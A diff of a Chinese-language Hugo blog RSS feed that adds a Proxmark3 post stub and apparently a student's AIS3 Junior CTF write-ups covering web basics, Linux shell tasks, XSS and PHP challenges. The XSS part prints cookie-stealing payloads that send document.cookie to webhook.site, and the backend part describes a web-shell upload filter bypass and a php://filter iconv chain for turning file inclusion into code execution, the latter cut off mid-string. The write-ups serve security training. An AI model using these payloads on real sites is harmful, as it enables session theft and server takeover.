@@ -7,7 +7,19 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-tw</language>
         <copyright>Chun-Hao Chung</copyright>
-        <lastBuildDate>Tue, 19 Aug 2025 00:00:00 +0800</lastBuildDate><atom:link href="https://agong88.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 25 Oct 2025 00:00:00 +0800</lastBuildDate><atom:link href="https://agong88.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Proxmark3 中文教學</title>
+        <link>https://agong88.github.io/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/</link>
+        <pubDate>Sat, 25 Oct 2025 00:00:00 +0800</pubDate>
+        
+        <guid>https://agong88.github.io/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/</guid>
+        <description>&lt;img src="https://agong88.github.io/post/proxmark3-%E4%B8%AD%E6%96%87%E6%95%99%E5%AD%B8/1.jpg" alt="Featured image of post Proxmark3 中文教學" /&gt;&lt;p&gt;這算是我生日買給自己的生日禮物（？&lt;br&gt;
+文章特選完後有空來補&lt;br&gt;
+主要是看到沒有純中文的教學所以想寫一份詳細的中文使用手冊&lt;br&gt;
+看看能不能來寫個明年的鐵人賽&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>114年度教育體系資安攻防演練檢測員心得</title>
         <link>https://agong88.github.io/post/114%E5%B9%B4%E5%BA%A6%E6%95%99%E8%82%B2%E9%AB%94%E7%B3%BB%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E6%BC%94%E7%B7%B4%E6%AA%A2%E6%B8%AC%E5%93%A1%E5%BF%83%E5%BE%97/</link>
         <pubDate>Tue, 19 Aug 2025 00:00:00 +0800</pubDate>
@@ -31,6 +43,814 @@
 		class=&#34;gallery-image&#34; 
 		data-flex-grow=&#34;112&#34;
 		data-flex-basis=&#34;270px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>2025 AIS3 Junior 前端ㄉWriteup</title>
+        <link>https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/</link>
+        <pubDate>Mon, 18 Aug 2025 00:00:00 +0800</pubDate>
+        
+        <guid>https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/</guid>
+        <description>&lt;h2 id=&#34;lab1&#34;&gt;Lab1
+&lt;/h2&gt;&lt;h3 id=&#34;get-ahead&#34;&gt;GET aHEAD
+&lt;/h3&gt;&lt;p&gt;看到變色方式改變是因為HTTP Method方式不同&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SJOtUbIueg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+那就看看有支援什麼HTTP Method&lt;br&gt;
+&lt;code&gt;curl -I http://mercury.picoctf.net:53554/&lt;/code&gt;&lt;br&gt;
+欸就有Flag了&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:picoCTF{r3j3ct_th3_du4l1ty_2e5ba39f}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;cookies&#34;&gt;Cookies
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/B18eM-IOlx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+一開始看到Cookie裡的&lt;code&gt;name&lt;/code&gt;可變，且每改一個數字內容不同&lt;br&gt;
+那先10個10個找最大值，找到最大為30&lt;br&gt;
+那就從1開始找，找到name=18時有flag&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SyhKzbIOxg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;inspect-html&#34;&gt;Inspect HTML
+&lt;/h3&gt;&lt;p&gt;進來後&lt;code&gt;Ctrl+U&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S1yGXbI_el.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;bookmarklet&#34;&gt;Bookmarklet
+&lt;/h3&gt;&lt;p&gt;進來後看到JS程式碼，那就複製到Online JS上執行&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BJt6mZIOex.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:picoCTF{p@g3_turn3r_e8b2d43b}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;webdecode&#34;&gt;WebDecode
+&lt;/h3&gt;&lt;p&gt;進來後都先看source code，發現沒有那就看看about&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/rJvtVZIdxx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+有看起來像base64的東西，那decode看看&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/r1M3Eb8uel.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:picoCTF{web_succ3ssfully_d3c0ded_07b91c79}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;lab2&#34;&gt;Lab2
+&lt;/h2&gt;&lt;h3 id=&#34;challenge-1&#34;&gt;challenge-1
+&lt;/h3&gt;&lt;p&gt;先&lt;code&gt;ls&lt;/code&gt;看看裡面有什麼&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S1MH9gI_gl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+那就&lt;code&gt;cat flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HybdceLuex.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{C0N9_Y0UR_F1R57_F1A9_😼}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-2&#34;&gt;challenge-2
+&lt;/h3&gt;&lt;p&gt;一樣&lt;code&gt;ls&lt;/code&gt;起手&lt;br&gt;
+欸那ㄟ跨謀那&lt;code&gt;ls -al&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S1MmieL_gg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+&lt;code&gt;cat .flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BJySsgIdeg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{15_a1_W0N7_M155_D07_🚩}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-3&#34;&gt;challenge-3
+&lt;/h3&gt;&lt;p&gt;一樣&lt;code&gt;ls&lt;/code&gt;然後&lt;code&gt;cat flag&lt;/code&gt;&lt;br&gt;
+他說要去&lt;code&gt;/&lt;/code&gt;的&lt;code&gt;/tmp&lt;/code&gt;加入一個meow的檔案&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/H17sslUuee.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+那就&lt;code&gt;cd /&lt;/code&gt;再&lt;code&gt;cd /tmp&lt;/code&gt;&lt;br&gt;
+然後&lt;code&gt;touch meow&lt;/code&gt;&lt;br&gt;
+最後&lt;code&gt;ls&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/ByTL2g8dll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{M30W_M30W_900D_J0B5}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-4&#34;&gt;challenge-4
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/B1l9heL_xx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+這說要移動grep檔案到第五題的資料夾&lt;br&gt;
+那就&lt;code&gt;mv grep ~/challenge-5&lt;/code&gt;&lt;br&gt;
+然後flag就會出來了&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BJUxpgUdgl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{M0V3_M0VE_HURRY_UP!}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-5&#34;&gt;challenge-5
+&lt;/h3&gt;&lt;p&gt;這題grep是執行檔，所以前面要&lt;code&gt;./&lt;/code&gt;&lt;br&gt;
+那就&lt;code&gt;./grep -r AIS3 maybe_here/&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/B1nTalL_gl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+有了前面的flag那就同理搜flag後面的}&lt;br&gt;
+&lt;code&gt;./grep -r } maybe_here/&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HyR-0gIuxe.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{M4st3r_0f_S34rch_1$_p0w3rfu11}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;challenge-6&#34;&gt;challenge-6
+&lt;/h3&gt;&lt;p&gt;一樣先&lt;code&gt;cat flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SyJynWIOxl.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+他說要刪掉他，那就&lt;code&gt;rm flag&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SJVeh-Idle.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:AIS3{RM_RF_CHUMMY_/_D0N7_D0_17_PL5}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;lab3&#34;&gt;Lab3
+&lt;/h2&gt;&lt;h3 id=&#34;xss1&#34;&gt;XSS1
+&lt;/h3&gt;&lt;p&gt;第一題先alert(123)看看有沒有XSS漏洞&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1.png&#34;
+	width=&#34;858&#34;
+	height=&#34;244&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_b2d36386b0a33ec3.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/1_hu_6c1074c47458715b.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;351&#34;
+		data-flex-basis=&#34;843px&#34;
+	
+&gt;&lt;br&gt;
+成功出現，那試看看上課教的fetch與demo的document.cookie&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fetch(&amp;#34;https://webhook.site/3e16d364-01c8-4ab6-a932-77caff270ea1?&amp;#34;+document.cookie);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2.png&#34;
+	width=&#34;877&#34;
+	height=&#34;842&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_419fb31979a0a70f.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/2_hu_f3a677ea8d738d.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;104&#34;
+		data-flex-basis=&#34;249px&#34;
+	
+&gt;&lt;br&gt;
+有拿到請求了，那就複製給admin點&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3.png&#34;
+	width=&#34;1073&#34;
+	height=&#34;649&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_88b303db64dbbf05.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/3_hu_89bd5ec331bd6009.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;165&#34;
+		data-flex-basis=&#34;396px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{w3lc0m3_70_x55_w0rld}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;xss2&#34;&gt;XSS2
+&lt;/h3&gt;&lt;p&gt;這題是要改成圖片的方式，所以payload改成&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1234&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fetch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://webhook.site/3e16d364-01c8-4ab6-a932-77caff270ea1?&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;同上，傳給admin點&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4.png&#34;
+	width=&#34;1176&#34;
+	height=&#34;647&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_a3ba054c814ceef1.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/4_hu_6f56b97ad340bead.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;436px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{1nn3rh7ml_15_n07_3x3cu73_5cr1p7}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;xss3&#34;&gt;XSS3
+&lt;/h3&gt;&lt;p&gt;先隨便丟一個payload發現是寫在button的超連結&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5.png&#34;
+	width=&#34;695&#34;
+	height=&#34;361&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_4217b133355145a0.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/5_hu_7ac543a0b1cd2f7e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;192&#34;
+		data-flex-basis=&#34;462px&#34;
+	
+&gt;&lt;br&gt;
+那再寫一個&lt;code&gt;javascript:&lt;/code&gt;來更新屬性&lt;br&gt;
+payload:&lt;code&gt;javascript:fetch(&#39;https://webhook.site/c08f7142-7637-4b38-b480-1343addd04c0?&#39;+encodeURIComponent(document.cookie))&lt;/code&gt;&lt;br&gt;
+最後去丟給admin就get flag&lt;br&gt;
+&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6.png&#34;
+	width=&#34;1014&#34;
+	height=&#34;840&#34;
+	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_5ee1a269c026ef49.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/6_hu_7b415012f6228630.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;120&#34;
+		data-flex-basis=&#34;289px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{p53ud0_pr070c4l_15_50m3_71m3_3v4l}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;xss4&#34;&gt;XSS4
+&lt;/h3&gt;&lt;p&gt;如果隨便丟payload進去會看到&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SJR-DcvOlx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+最後會拼起來成&lt;code&gt;https://c.beta-lib.dpdns.org/kind/lflflflflfl/static/script.js&lt;/code&gt;&lt;br&gt;
+payload=&lt;code&gt;&amp;lt;base href=&amp;quot;https://hamichiowo.github.io/JavaScript-db&amp;quot;&amp;gt;&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HJejs9Pdlg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{b453-url_w1ll_n07_f4llb4ck_70_d3f4ul7-5rc}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>2025 AIS3 Junior 後端ㄉWriteup</title>
+        <link>https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/</link>
+        <pubDate>Mon, 18 Aug 2025 00:00:00 +0800</pubDate>
+        
+        <guid>https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/</guid>
+        <description>&lt;img src="https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.png" alt="Featured image of post 2025 AIS3 Junior 後端ㄉWriteup" /&gt;&lt;h3 id=&#34;phpisbest&#34;&gt;phpisbest
+&lt;/h3&gt;&lt;p&gt;進去後看到下面這些程式碼&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/B1YY3MOOll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+那可以用上課教的把他轉成陣列，這樣比較時就會變成弱比較，就會==0&lt;br&gt;
+Payload:&lt;code&gt;https://chall.nckuctf.org:28106/?A[]=1&amp;amp;B[]=2&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/r1yGTfduxx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{php_15_7h3_8357_14n9u493}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;uploader-waf&#34;&gt;uploader-waf
+&lt;/h3&gt;&lt;p&gt;一樣用一行php，但要繞過.php的限制，所以取.PhP&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/Skz-uGvOgg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+然後在Burp改檔名把.png刪掉&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/BkbBoMw_xx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+然後去讀檔並後面試試&lt;code&gt;ls /&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SkFp9fw_ll.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+最後&lt;code&gt;cat%20/flag_NCA4jqt&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HJe1jMwdle.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{w385h311_15_4_427_4nd_m491c}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;pathwalker-waf&#34;&gt;Pathwalker Waf
+&lt;/h3&gt;&lt;p&gt;進去後點咖波會說flag在&lt;code&gt;/var/www/html/flag.php&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/SyX6yQDuxe.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+先試試在&lt;code&gt;?page=&lt;/code&gt;塞&lt;code&gt;../&lt;/code&gt;&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/Sy7mlXDuge.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+出現錯誤代碼了，再來一直塞&lt;code&gt;../&lt;/code&gt;就好&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/S14Ux7vugg.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Flag:NCKUCTF{p47h_724v32541_h45_4107_721ck}&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h3 id=&#34;lfi2rce&#34;&gt;lfi2rce
+&lt;/h3&gt;&lt;p&gt;進去後看到flag is in root dir&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/H1g3lXP_xx.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+手癢把cappo.php刪掉想看看會怎樣&lt;br&gt;
+&lt;img src=&#34;https://hackmd.io/_uploads/HyWGZQP_ex.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;br&gt;
+出現錯誤代碼，那用上課教的&lt;a class=&#34;link&#34; href=&#34;https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/test.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;php偽協議&lt;/a&gt;&lt;br&gt;
+:::spoiler php偽協議&lt;br&gt;
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.ISO-IR-156.8859_9|convert.iconv.CSISOLATINGREEK.MSCP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.iconv.CSISO99NAPLPS.CP902|convert.iconv.ISO-IR-143.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.PT154.874|convert.iconv.CSISO2022KR.UTF-32|convert.iconv.CSIBM901.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO2022KR.UTF16|convert.iconv.LATIN6.CSUCS4|convert.iconv.UTF-32BE.ISO_6937-2:1983|convert.iconv.ISO-IR-111.CSWINDOWS31J|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSA_T500.EUCJP-WIN|convert.iconv.CP855.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.UCS-4BE|convert.iconv.OSF00010004.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.ISO-10646/UTF-8|convert.iconv.BALTIC.SHIFT_JISX0213|convert.iconv.CP949.CP1361|convert.iconv.CSISOLATIN2.T.61|convert.iconv.IBM932.BIG-5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.NAPLPS.UCS-4|convert.iconv.ISO_8859-4.T.618BIT|c